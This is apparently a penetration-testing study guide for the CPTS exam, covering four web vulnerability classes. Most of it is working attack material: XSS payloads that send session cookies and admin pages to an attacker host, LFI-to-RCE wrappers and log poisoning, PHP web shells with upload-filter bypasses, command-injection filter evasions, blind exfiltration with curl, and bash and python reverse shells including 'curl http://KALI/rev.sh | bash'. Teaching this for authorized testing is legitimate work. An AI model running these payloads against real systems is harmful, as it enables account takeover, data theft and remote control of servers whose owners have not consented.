# 17-20 — Web Vulnerability Classes (XSS, LFI, Upload, Command Injection)

These four web vulnerability types appear frequently on the CPTS exam as initial footholds. Each section covers detection, exploitation, and filter bypass techniques.

---

## Cross-Site Scripting (XSS)

### What XSS is

XSS injects JavaScript into a web page that other users view. The injected script runs in the victim's browser with their session cookies, allowing account takeover, data theft, or further exploitation.

### Types

```
Reflected XSS:  Payload is in the URL → sent to server → reflected back
                The victim must click a crafted link
                
Stored XSS:     Payload is saved in the database → displayed to all users
                More dangerous — every visitor triggers it
                
DOM-based XSS:  Payload is processed entirely in the browser's JavaScript
                Never reaches the server
```

### Testing

```bash
# Basic test
<script>alert(1)</script>

# If angle brackets are filtered
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='

# If "script" is blocked
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

# Steal cookies (the real attack)
<script>new Image().src="http://KALI:8080/?c="+document.cookie</script>
# Start a listener on Kali: python3 -m http.server 8080
# When a user loads the page, their cookie is sent to you
```

### XSS on the CPTS

XSS is less about popping `alert(1)` and more about:
- Stealing admin session cookies → access admin panel
- Triggering actions as another user (CSRF-like)
- Reading page content that only authenticated users can see

```javascript
// Steal cookies and send to your server
<script>fetch('http://KALI:8080/?c='+document.cookie)</script>

// Read a page and send its content to you
<script>
fetch('/admin/config').then(r=>r.text()).then(t=>fetch('http://KALI:8080/?data='+btoa(t)))
</script>
```

---

## File Inclusion (LFI/RFI)

### Local File Inclusion

The application includes a file based on user input:

```php
include($_GET['page']);
```

```bash
# Basic path traversal
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd           # double encoding bypass
?page=..%252f..%252f..%252fetc/passwd        # double URL encoding

# Read PHP source code (base64 encoded)
?page=php://filter/convert.base64-encode/resource=config.php
# Decode: echo "BASE64" | base64 -d

# PHP wrappers for RCE
?page=php://input
# POST body: <?php system('whoami'); ?>

?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
# base64 of: <?php system($_GET['cmd']); ?>
# Then: &cmd=whoami

# Log poisoning (LFI → RCE)
# 1. Inject PHP into log via User-Agent:
curl http://TARGET -A "<?php system(\$_GET['cmd']); ?>"
# 2. Include the log:
?page=../../../../var/log/apache2/access.log&cmd=whoami
```

### Windows LFI paths

```
?page=..\..\..\..\windows\win.ini
?page=..\..\..\..\windows\system32\drivers\etc\hosts
?page=..\..\..\..\inetpub\wwwroot\web.config
```

### Remote File Inclusion (RFI)

If `allow_url_include=On` in PHP:

```bash
# Host a PHP shell on Kali
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80

# Include it remotely
?page=http://KALI/shell.php&cmd=whoami
```

---

## File Upload Attacks

### Basic upload — no filter

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Upload through the web form
# Access: http://TARGET/uploads/shell.php?cmd=whoami
```

### Bypassing extension filters

```bash
# Extension blacklist bypass
shell.php3            # alternative PHP extension
shell.php5
shell.phtml
shell.phar
shell.php.jpg         # double extension
shell.php%00.jpg      # null byte (PHP < 5.3.4)
shell.pHp             # case variation

# Content-Type bypass (change in Burp)
Content-Type: image/jpeg    # instead of application/x-php

# Magic bytes bypass (add image header to PHP file)
echo -e '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php.png
# File starts with PNG magic bytes, passes validation
# But Apache executes it as PHP if .php is in the name

# .htaccess upload (Apache — make .jpg execute as PHP)
# Upload .htaccess with:
AddType application/x-httpd-php .jpg
# Then upload shell.jpg — Apache treats it as PHP
```

### Web shell alternatives

```bash
# Simple command execution
<?php system($_GET['cmd']); ?>

# More functional web shell
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>

# File manager shell (p0wny-shell, etc.)
# Search GitHub for "php web shell" — upload a full-featured one
```

---

## Command Injection

### Injection characters

```
;        Semicolon — command separator (Linux)
|        Pipe — pipe output to next command
||       OR — run second if first fails
&        Background first, run second
&&       AND — run second if first succeeds
`cmd`    Backticks — command substitution
$(cmd)   Dollar-paren — command substitution
\n       Newline (URL: %0a) — command separator
```

### Testing

```bash
# Test each separator
;id
|id
||id
&id
&&id
$(id)
`id`
```

### Filter bypasses

```bash
# If spaces are blocked
{cat,/etc/passwd}                     # brace expansion
cat${IFS}/etc/passwd                  # $IFS = Internal Field Separator (space)
cat$IFS/etc/passwd
cat</etc/passwd                       # input redirection

# If specific commands are blocked
c'a't /etc/passwd                     # quote insertion
c"a"t /etc/passwd
/bin/c?t /etc/passwd                  # wildcard
who$()ami                             # empty command substitution

# If outbound connections are blocked (can't get a reverse shell)
# Write output to a web-accessible file
;id > /var/www/html/output.txt
# Then read: curl http://TARGET/output.txt

# Blind command injection (no output visible)
;sleep 5                              # if response is delayed, injection works
;curl http://KALI:8080/$(whoami)      # exfiltrate through DNS/HTTP
;ping -c 1 KALI                       # check with tcpdump on Kali
```

### From command injection to reverse shell

```bash
# Bash reverse shell (URL encode if needed)
;bash -c 'bash -i >& /dev/tcp/KALI/4444 0>&1'

# If bash is blocked
;python3 -c 'import os,socket,subprocess;s=socket.socket();s.connect(("KALI",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Write a script and execute it (avoids encoding issues)
;echo 'bash -i >& /dev/tcp/KALI/4444 0>&1' > /tmp/rev.sh
;bash /tmp/rev.sh

# Using curl to download and execute
;curl http://KALI/rev.sh | bash
```

---

## Web Attack Methodology for CPTS

```
For EVERY web application:

1. IDENTIFY inputs (URL params, forms, headers, cookies, JSON)
2. TEST each input for:
   □ SQL injection (single quote, OR 1=1)
   □ Command injection (;id, |whoami)
   □ LFI (../../../../etc/passwd)
   □ XSS (<script>alert(1)</script>)
   □ IDOR (change ID values)
   □ XXE (if XML input is accepted)
3. CHECK for file upload functionality
4. If injection found → escalate to RCE
5. If RCE achieved → reverse shell → post-exploitation
6. HARVEST credentials → test on other machines
```
